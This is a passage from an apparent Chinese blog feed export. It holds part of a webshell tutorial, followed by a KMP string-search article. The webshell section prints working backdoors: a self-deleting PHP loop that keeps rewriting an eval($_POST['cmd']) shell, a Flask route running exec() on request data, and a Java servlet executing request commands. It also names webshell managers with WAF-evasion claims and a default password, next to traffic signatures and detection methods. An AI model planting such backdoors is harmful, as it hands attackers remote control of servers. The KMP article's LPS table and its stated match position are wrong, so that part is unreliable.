class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;username&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;myDB&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// 检查连接</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM Users&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 输出数据</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>]. <span class="string">&quot; - Name: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>]. <span class="string">&quot; &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;email&quot;</span>]. <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0 results&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ASP 示例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">Dim conn, rs, sql</span><br><span class="line">Set conn = Server.CreateObject(&quot;ADODB.Connection&quot;)</span><br><span class="line">conn.Open &quot;Provider=SQLOLEDB;Data Source=your_server;Initial Catalog=your_db;User Id=your_username;Password=your_password;&quot;</span><br><span class="line"></span><br><span class="line">sql = &quot;SELECT * FROM Users&quot;</span><br><span class="line">Set rs = conn.Execute(sql)</span><br><span class="line"></span><br><span class="line">Do While Not rs.EOF</span><br><span class="line">    Response.Write(&quot;Username: &quot; &amp; rs(&quot;username&quot;) &amp; &quot;&lt;br&gt;&quot;)</span><br><span class="line">    rs.MoveNext</span><br><span class="line">Loop</span><br><span class="line"></span><br><span class="line">rs.Close</span><br><span class="line">Set rs = Nothing</span><br><span class="line">conn.Close</span><br><span class="line">Set conn = Nothing</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><strong>JSP 示例：</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.sql.*&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/myDB&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> <span class="string">&quot;username&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;password&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url, user, password);</span><br><span class="line"><span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(<span class="string">&quot;SELECT * FROM Users&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">    out.println(<span class="string">&quot;Username: &quot;</span> + rs.getString(<span class="string">&quot;username&quot;</span>) + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rs.close();</span><br><span class="line">stmt.close();</span><br><span class="line">conn.close();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="6-内存马（In-Memory-Shells）"><a href="#6-内存马（In-Memory-Shells）" class="headerlink" title="6. 内存马（In-Memory Shells）"></a>6. 内存马（In-Memory Shells）</h3><p>内存马是无文件攻击的一种常用手段，随着攻防演练热度越来越高：攻防双方的博弈，流量分析、EDR等专业安全设备被蓝方广泛使用，传统的文件上传的webshll或以文件形式驻留的后门越来越容易被检测到，内存马使用越来越多。</p><p>Webshell内存马，是在内存中写入恶意后门和木马并执行，达到远程控制Web服务器的一类内存马，其瞄准了企业的对外窗口：网站、应用。但传统的Webshell都是基于文件类型的，黑客可以利用上传工具或网站漏洞植入木马，区别在于Webshell内存马是无文件马，利用中间件的进程执行某些恶意代码，不会有文件落地，给检测带来巨大难度。</p><p>PHP内存马，也叫做PHP不死马、不死僵尸，在线下AWD中是常用手段之一。在蚁剑中也有专门的插件可以一键注入内存马。<br>原理也很简单，相对于Java可以直接把整个shell写入内存，php内存马的实现则是将一个木马反复写入，达到无法删除的目的。<br><strong>PHP 示例（利用PHP-FPM漏洞的示例，虚构）：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>); <span class="comment">//设置客户端断开连接时是否中断脚本的执行</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>); <span class="comment">//设置脚本最大执行时间，linux下可能不大好用</span></span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>); <span class="comment">//删除自身</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;shell.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$code</span>);<span class="comment">//恶意代码</span></span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>); <span class="comment">//延迟执行可有可无</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本质上原理是不变，执行死循环，然后删除自身。但实际上这样做还是会有文件落地，只是管理员删不掉、删不完罢了。也可以用利用fastcgi对php攻击执行命令，但这样是否算一个驻留wenshell还有待争议。</p><p><strong>Python 示例（使用flask框架）：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/exec&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_code</span>():</span><br><span class="line">    <span class="built_in">exec</span>(request.data)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Code executed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p><em>注：这个示例表明代码直接从请求中执行，不进行任何磁盘写入操作。</em></p><p><strong>Java 示例（通过Servlet执行命令）：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InMemoryShell</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> request.getReader().readLine();</span><br><span class="line">        <span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">out</span> <span class="operator">=</span> proc.getOutputStream();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="WebShell管理工具"><a href="#WebShell管理工具" class="headerlink" title="WebShell管理工具"></a>WebShell管理工具</h2><ol><li><p>中国菜刀（Chopper）<br>  中国菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理！在非简体中文环境下使用，自动切换到英文界面。UNICODE方式编译，支持多国语言输入显示。<br>  官方网站：<a href="http://www.maicaidao.com/">http://www.maicaidao.com/</a></p></li><li><p>中国蚁剑（AntSword）<br>  中国蚁剑是一款开源的跨平台网站管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。是一款非常优秀的webshell管理工具。使用编&#x2F;解码器进行流量混淆可绕过WAF，并且有多款实用插件。<br>  因为菜刀也许有后门(偷shell)，不放心可以用蚁剑，蚁剑还可以看源码，功能也比菜刀强些。<br>  项目地址：<br>  <a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p></li><li><p>冰蝎(Behinder)<br>  冰蝎是一款基于Java开发的动态二进制加密通信流量的新型Webshell客户端，由于它的通信流量被加密，使用传统的WAF、IDS等设备难以检测，目前在HW中使用较多的一款工具。下载下来的文件夹server 里的都是木马。<br>  功能介绍原文链接：<br>  《利用动态二进制加密实现新型一句话木马之客户端篇》 <a href="https://xz.aliyun.com/t/2799">https://xz.aliyun.com/t/2799</a><br>  工作原理原文链接：<br>  《利用动态二进制加密实现新型一句话木马之Java篇》 <a href="https://xz.aliyun.com/t/2744">https://xz.aliyun.com/t/2744</a><br>  《利用动态二进制加密实现新型一句话木马之.NET篇》 <a href="https://xz.aliyun.com/t/2758">https://xz.aliyun.com/t/2758</a><br>  《利用动态二进制加密实现新型一句话木马之PHP篇》 <a href="https://xz.aliyun.com/t/2774">https://xz.aliyun.com/t/2774</a><br>  项目地址：<br>  <a href="http://github.com/rebeyond/Behinder">http://github.com/rebeyond/Behinder</a></p></li><li><p>哥斯拉(Godzilla)<br>  哥斯拉是一款继冰蝎之后又一款于Java开发的加密通信流量的新型Webshell客户端，内置了3种有效载荷以及6种加密器，6种支持脚本后缀，20个内置插件，也是目前在HVV中使用较多的一款工具。<br>  项目地址：<a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p></li><li><p>weevely<br>  weevely 是 Linux 系统自带的菜刀，使用python编写的webshell工具，集webshell生成和连接于一身，采用c&#x2F;s模式构建，可以算作一款 php菜刀 替代工具，具有很好的隐蔽性。<br>  在linux上使用时还是很好的，集服务器错误配置审计，后门放置，暴力破解，文件管理，资源搜索，网络代理，命令执行，数据库操作，系统信息收集及端口扫描等功能。</p></li></ol><p>不同的Webshell管理工具的流量特征如下：<br><a href="https://blog.csdn.net/weixin_45585955/article/details/130075885">https://blog.csdn.net/weixin_45585955/article/details/130075885</a></p><ol><li><strong>菜刀</strong><br> 首先请求体中传递的payload为base64编码，并且存在固定的，其次请求体中存在eval，base64等特征字符。最后传给cmd的这些流量字符中有自己的特征，1、都是系统命令；2、必须以分号结尾；3、数据包源一般是ip。<br> 中国菜刀2011版本及2014版本各语言WebShell链接流量特征<br> - PHP类WebShell链接流量<br>     其中特征主要在body中，将body中流量进行url解码后如下：<br>     其中特征点有如下三部分，<br>     第一：“eval”，eval函数用于执行传递的攻击payload，这是必不可少的；<br>     第二：<code>(base64_decode($_POST[z0]))，(base64_decode($_POST[z0]))</code>将攻击payload进行Base64解码，因为菜刀默认是将攻击载荷使用Base64编码，以避免被检测；<br>     第三：&amp;z0&#x3D;QGluaV9zZXQ…，该部分是传递攻击payload，此参数z0对应<code>$_POST[z0]</code>接收到的数据，该参数值是使用Base64编码的，所以可以利用base64解码可以看到攻击明文。<br>     注：<br>         1.有少数时候eval方法会被assert方法替代。<br>         2.$_POST也会被$_GET、$_REQUEST替代。<br>         3.z0是菜刀默认的参数，这个地方也有可能被修改为其他参数名。<br> - SP类WebShell链接流量：<br>     该流量是WebShell链接流量的第一段链接流量，其中特征主要在i&#x3D;A&amp;z0&#x3D;GB2312，菜刀链接JSP木马时，第一个参数定义操作，其中参数值为A-Q，如i&#x3D;A，第二个参数指定编码，其参数值为编码，如z0&#x3D;GB2312，有时候z0后面还会接着又z1&#x3D;参数用来加入攻击载荷。<br>     注：其中参数名i、z0、z1这种参数名是会变的，但是其参数值以及这种形式是不会变得，最主要就是第一个参数值在A-Q，这种是不变的。<br> - ASP类WebShell链接流量：<br>     其中body流量进行URL解码后<br>     其中特征点有如下三部分，<br>     第一：“Execute”，Execute函数用于执行传递的攻击payload，这是必不可少的，这个等同于php类中eval函数；<br>     第二：OnError ResumeNext，这部分是大部分ASP客户端中必有的流量，能保证不管前面出任何错，继续执行以下代码。<br>     第三：Response.Write和Response.End是必有的，是来完善整个操作的。<br>     这种流量主要识别这几部分特征，在正常流量中基本没有。<br>     注：OnError Resume Next这个特征在大部分流量中存在，极少数情况没有。<br> 中国菜刀2016版本各语言WebShell链接流量特征：<br> - PHP类WebShell链接流量：<br>     其中特征主要在body中，将body中部分如下：<br>     这个版本中流量最大的改变就是将特征进行打断混淆，这也给我们识别特征提供一种思路。<br>     其中特征点有如下三部分，<br>     第一：“”Ba”.”SE6”.”4_dEc”.”OdE”，这部分是将base64解码打断使用.来连接。<br>     第二：@ev”.”al，这部分也是将@eval这部分进行打断连接，可以识别这段代码即可。<br>     第三：QGluaV9zZXQoImRpc3BsYXlf…，该部分是传递攻击payload，payload依旧使用Base64编码的，所以可以利用base64解码可以看到攻击明文来识别。<br>     注：有少数时候eval方法会被assert方法替代。<br> - JSP类WebShell链接流量:<br>     该版本JSPwebshell流量与之前版本一样，<br>     所以分析如上：该流量是WebShell链接流量的第一段链接流量，其中特征主要在i&#x3D;A&amp;z0&#x3D;GB2312，菜刀链接JSP木马时，第一个参数定义操作，其中参数值为A-Q，如i&#x3D;A，第二个参数指定编码，其参数值为编码，如z0&#x3D;GB2312，有时候z0后面还会接着又z1&#x3D;、z2&#x3D;参数用来加入攻击载荷。<br>     注：其中参数名i、z0、z1这种参数名是会变的，但是其参数值以及这种形式是不会变得，最主要就是第一个参数值在A-Q，这种是不变的。<br> - ASP类WebShell链接流量：<br>     其中body流量为：<br>     2016版本流量这链接流量最大的变化在于body中部分字符被unicode编码替换混淆，所以这种特征需要提取出一种形式来，匹配这个混淆特征，比如“字符+%u0000+字符+%u0000”这种形式来判断该流量。<br>     或者直接将这部分代码直接进行unicode解码，可以获取到如2011或2014版本的asp所示的流量。可以根据上一段特征来进行判断。<br>     这种流量主要识别这几部分特征，在正常流量中基本没有。</li><li><strong>蚁剑</strong>：使用base64加密，流量中包含<code>@ini_set (&quot;display_errors&quot;,&quot;0&quot;)</code>代码<br> 蚁剑流量特征概述：<br> 可以对流量进行加密、混淆。但是有些关键代码没有被加密，如：PHP中的ini_set；ASP中的OnError，response等，流量特征：使用bse64加密的payload，数据包存在以下base加密的eval命令执行，数据包的payload内容存在几个分段内容，分别都使用base加密，解密后可以看到相关的路径，命令等；<br> （1）蚁剑PHP类WebShell链接流量<br> 其中body流量进行URL解码后为：<br> 其中流量最中明显的特征为@ini_set(“display_errors”,”0”);这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码，但是有的客户端会将这段编码或者加密，而蚁剑是明文，所以较好发现。<br> （2）蚁剑ASP类WebShell链接流量<br> 其中body流量进行URL解码后为：<br> 我们可以看出蚁剑针对ASP类的WebShell流量与菜刀的流量很像，其中特征也是相同，如OnError ResumeNext、Response.End、Response.Write，其中execute在蚁剑中被打断混淆了，变成了拼接形式Ex”&amp;cHr(101)&amp;”cute，同时该流量中也使用了eval参数，可以被认为明显特征。</li><li><strong>冰蝎</strong>：客户端以Get形式发起带密码的请求，服务端产生随机密钥并返回给客户端，客户端用AES加密payload。默认连接密码为”e45e329feb5d925b”。<br> 冰蝎流量特征概述：是一款动态二进制加密网站管理客户端。主要用于配合服务端shell的动态二进制加密通信，适用于WAF拦截回显等场景，客户端的流量无法检测。<br> （1）冰蝎3.0：<br> 随着冰蝎的不断更新，功能越来越完善，到3.0已经具备了红队需要的各种功能，特别是反弹shell的msf和cs上线，以及自定义代码执行，灵活性很强。基本做到开箱即用且功能齐全，唯一的问题是，工具流行之后，webshell本体容易被查杀，需要做webshell本体的免杀。<br> 由于冰蝎把类动态加载这个关键技术摆在台面上，在一段时间的研究后，Java内存马已经有了很多可用的思路，比如新增filter，只从内存操作，不依赖落地文件，就能访问到内存中的Webshell，这就解决了webshell本体免杀问题。 这种情况下冰蝎更新v3.0 beta7版本，增加了Java内存马功能，并且使用了更高级的Java Agent技术，通过hook Java进程中原本正常的类，实现内存马功能，并在beta8增加了内存马防查杀机制。<br> （2）冰蝎4.0<br> 冰蝎更新了4.0版本，增加了webshell生成功能，可以完全自定义流量加密方法，对流量加密的灵活性又大大增加。在webshell工具领域，冰蝎独占鳌头。在去年的攻防演练中统计到的webshell有效攻击中，有80%都是使用的冰蝎或冰蝎变种，足以证明冰蝎的强大功能。 </li><li><strong>哥斯拉</strong><br> <a href="https://blog.csdn.net/weixin_46684578/article/details/122148960">https://blog.csdn.net/weixin_46684578/article/details/122148960</a><br> <a href="https://www.cnblogs.com/danyue/p/18146698">https://www.cnblogs.com/danyue/p/18146698</a><br> <a href="https://blog.csdn.net/m0_74077634/article/details/141931463">https://blog.csdn.net/m0_74077634/article/details/141931463</a><br> <a href="https://www.cnblogs.com/smileleooo/p/18178347">https://www.cnblogs.com/smileleooo/p/18178347</a><br> 是基于流量、HTTP全加密的webshell工具；哥斯拉全部类型的shell 能绕过市面所有静态查杀；哥斯拉流量加密能绕过市面全部流量waf。</li></ol><h2 id="Webshell检测方法"><a href="#Webshell检测方法" class="headerlink" title="Webshell检测方法"></a>Webshell检测方法</h2><p>你所不知道的Webshell–进阶篇 <a href="https://cloud.tencent.com/developer/article/1647762">https://cloud.tencent.com/developer/article/1647762</a><br>目前检测Webshell的方式较多，有基于HTTP流量、基于Web访问日志、基于文件特征等方法<br>继上期介绍了Webshell的基础知识和防护技巧后，本期我们将深入探讨Webshell的检测方法。由于Webshell的隐蔽性和多变性，仅依靠单一手段难以有效检测。因此，本文将重点介绍多种检测方法，以协助安全人员全面了解并部署有效的Webshell检测策略。</p><ol><li>基于HTTP流量的检测<br>  利用网络监控工具分析HTTP流量是检测Webshell活动的一种有效手段。通过监控异常的HTTP请求，如非标准时间的高频请求、含有异常参数的请求等，可以初步判断是否存在Webshell活动。<br>  <strong>实施步骤：</strong></li></ol><ul><li><strong>部署网络嗅探工具</strong>，如Wireshark或tcpdump，捕捉经过的HTTP包。</li><li><strong>分析HTTP请求</strong>，特别注意POST请求，这类请求通常用于Webshell命令的传输。</li><li><strong>标记异常模式</strong>，如频繁访问、大量上传下载或者命令参数等。</li></ul><ol start="2"><li>基于Web访问日志的检测<br>  Web服务器的访问日志记录了所有进入网站的请求，通过分析这些日志，可以发现异常访问模式或疑似Webshell的踪迹。</li></ol><p>  <strong>实施步骤：</strong></p><ul><li><strong>收集访问日志</strong>，如Apache的access.log，Nginx的access.log。</li><li><strong>使用日志分析工具</strong>，如GoAccess或ELK Stack（Elasticsearch, Logstash, Kibana），对日志文件进行深入分析。</li><li><strong>设置警报</strong>，对于异常的访问模式，如非业务时间的大量请求、频繁的后台路径访问等，设置自动警报。</li></ul><ol start="3"><li>基于文件特征的检测<br>  文件特征检测通过分析Webshell的代码模式进行识别。该方法依赖于更新的数据库和特征码，用于识别已知的Webshell。</li></ol><p>  <strong>实施步骤：</strong></p><ul><li><strong>使用YARA工具</strong>，根据已知的Webshell特征创建规则。</li><li><strong>定期更新规则库</strong>，跟随新的Webshell变化更新。</li><li><strong>扫描Web目录</strong>，将YARA与定期扫描任务结合，检查服务器上的文件。</li></ul><ol start="4"><li>基于行为分析的检测<br>  行为分析不依赖于Webshell的代码特征，而是通过监测系统的行为来识别异常。这包括文件的异常创建、修改，以及系统命令的异常调用等。</li></ol><p>  <strong>实施步骤：</strong></p><ul><li>**部署Sysmon (System Monitor)**，监控Windows环境下的系统活动，如进程创建、网络连接等。</li><li><strong>使用auditd服务</strong>，在Linux环境下监控关键文件的读写和执行行为。</li><li><strong>分析系统调用日志</strong>，对于使用系统管理命令如<code>netstat</code>、<code>ipconfig</code>等频繁的进程进行进一步分析。</li></ul><h2 id="逃避技术"><a href="#逃避技术" class="headerlink" title="逃避技术"></a>逃避技术</h2><p>详见webshell免杀笔记</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【算法】KMP算法详解</title>
      <link href="/2024/10/18/algorithm/kmp/"/>
      <url>/2024/10/18/algorithm/kmp/</url>
      
        <content type="html"><![CDATA[<p>KMP（Knuth-Morris-Pratt）算法是一种用于字符串搜索的算法，它可以在一个文本字符串中搜索一个模式（即子字符串），其时间复杂度是O(n + m)，其中n是文本字符串的长度，m是模式的长度。KMP算法的关键优势是它能在不回溯文本串的指针的情况下，通过预处理模式串，实现快速的模式匹配。</p><h2 id="KMP算法的核心思想："><a href="#KMP算法的核心思想：" class="headerlink" title="KMP算法的核心思想："></a>KMP算法的核心思想：</h2><p>KMP算法的核心是一个叫做“部分匹配表”（Partial Match Table）或者“最长公共前后缀”（Longest Prefix which is also Suffix，简称LPS）数组的预处理。这个表用于在发生不匹配时，决定文本字符串中的哪个位置应该是下一个比较的开始点，从而避免了从头开始比较。</p><h2 id="如何构建LPS数组："><a href="#如何构建LPS数组：" class="headerlink" title="如何构建LPS数组："></a>如何构建LPS数组：</h2><ol><li><strong>初始化：</strong> 创建一个LPS数组来保存每个前缀的最长公共前后缀长度。初始化一个变量 <code>len</code> 为 0，这个变量表示当前计算的最长的公共前后缀的长度，数组的第一个元素（LPS[0]）总是0。</li><li><strong>处理：</strong> 从模式串的第二个字符开始处理到最后一个字符。<ul><li>如果当前字符和<code>len</code>指向的字符相同，就更新LPS数组，<code>len</code>加1。</li><li>如果不同，减小<code>len</code>值，直到<code>len</code>为0或者找到一对相同的字符。</li><li>将当前<code>len</code>的值赋给LPS数组。</li></ul></li></ol><h2 id="如何使用LPS数组进行搜索："><a href="#如何使用LPS数组进行搜索：" class="headerlink" title="如何使用LPS数组进行搜索："></a>如何使用LPS数组进行搜索：</h2><ol><li><strong>初始化指针：</strong> 使用两个指针<code>i</code>和<code>j</code>分别跟踪文本和模式的位置。</li><li><strong>匹配过程：</strong><ul><li>当<code>text[i]</code>和<code>pattern[j]</code>匹配时，如果<code>j</code>是模式的最后一位，表示找到一个匹配，记录位置，<code>j</code>回退到<code>LPS[j-1]</code>。</li><li>如果<code>text[i]</code>和<code>pattern[j]</code>不匹配，如果<code>j</code>不是0，将<code>j</code>回退到<code>LPS[j-1]</code>，否则<code>i</code>递增。</li></ul></li><li><strong>继续检查：</strong> 移动<code>i</code>，直到文本结束。</li></ol><h2 id="构建LPS数组的步骤详解："><a href="#构建LPS数组的步骤详解：" class="headerlink" title="构建LPS数组的步骤详解："></a>构建LPS数组的步骤详解：</h2><p>假设我们有模式串 <code>pattern = &quot;ABABCABAA&quot;</code>，我们要构建一个LPS数组来表示每个前缀的最长公共前后缀长度。下面是构建LPS数组的具体步骤：</p><ol><li><p><strong>初始化</strong>：</p><ul><li><code>len = 0</code>（表示当前最长的公共前后缀长度）</li><li><code>LPS[0] = 0</code>（第一个元素的最长公共前后缀长度为0，因为只有一个字符）</li></ul></li><li><p><strong>遍历模式串</strong>：</p><ul><li>从索引1开始，比较当前字符与<code>len</code>位置的字符。</li><li>如果匹配，<code>len</code>增加1，并将<code>len</code>赋值给<code>LPS[i]</code>。</li><li>如果不匹配，减少<code>len</code>直到0或找到匹配。如果找到匹配，如前所述操作；如果<code>len</code>减到0仍未匹配，<code>LPS[i]</code>设为0。</li></ul></li></ol><p>对于<code>pattern = &quot;ABABCABAA&quot;</code>，构建的LPS数组如下：</p><table><thead><tr><th>i</th><th>Pattern[i]</th><th>len</th><th>LPS</th></tr></thead><tbody><tr><td>0</td><td>A</td><td>0</td><td>0</td></tr><tr><td>1</td><td>B</td><td>0</td><td>0</td></tr><tr><td>2</td><td>A</td><td>1</td><td>1</td></tr><tr><td>3</td><td>B</td><td>0</td><td>0</td></tr><tr><td>4</td><td>C</td><td>0</td><td>0</td></tr><tr><td>5</td><td>A</td><td>1</td><td>1</td></tr><tr><td>6</td><td>B</td><td>2</td><td>2</td></tr><tr><td>7</td><td>A</td><td>3</td><td>3</td></tr><tr><td>8</td><td>A</td><td>1</td><td>1</td></tr></tbody></table><h2 id="使用LPS数组进行搜索的步骤详解："><a href="#使用LPS数组进行搜索的步骤详解：" class="headerlink" title="使用LPS数组进行搜索的步骤详解："></a>使用LPS数组进行搜索的步骤详解：</h2><p>假设我们有文本 <code>text = &quot;ABABABCABAAABABCABAA&quot;</code>，我们要在这个文本中搜索<code>pattern = &quot;ABABCABAA&quot;</code>。</p><ol><li><p><strong>初始化指针</strong>：</p><ul><li><code>i = 0</code>（文本的位置）</li><li><code>j = 0</code>（模式的位置）</li></ul></li><li><p><strong>搜索过程</strong>：</p><ul><li>遍历文本，当<code>text[i]</code>和<code>pattern[j]</code>匹配时，递增<code>i</code>和<code>j</code>。</li><li>如果<code>j</code>达到模式长度，表明找到一个完整匹配，记录匹配的起始位置<code>i-j</code>，然后将<code>j</code>回退到<code>LPS[j-1]</code>。</li><li>如果<code>text[i]</code>和<code>pattern[j]</code>不匹配：<ul><li>如果<code>j</code>不是0，回退<code>j</code>到<code>LPS[j-1]</code>。</li><li>如果<code>j</code>是0，则仅递增<code>i</code>。</li></ul></li></ul></li></ol><p>对于我们的例子，首次匹配发生在文本的第10个字符开始。</p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【论文精度】CamPro Camera-based Anti-Facial Recognition</title>
      <link href="/2024/10/16/PaperReading/javacode/"/>
      <url>/2024/10/16/PaperReading/javacode/</url>
      
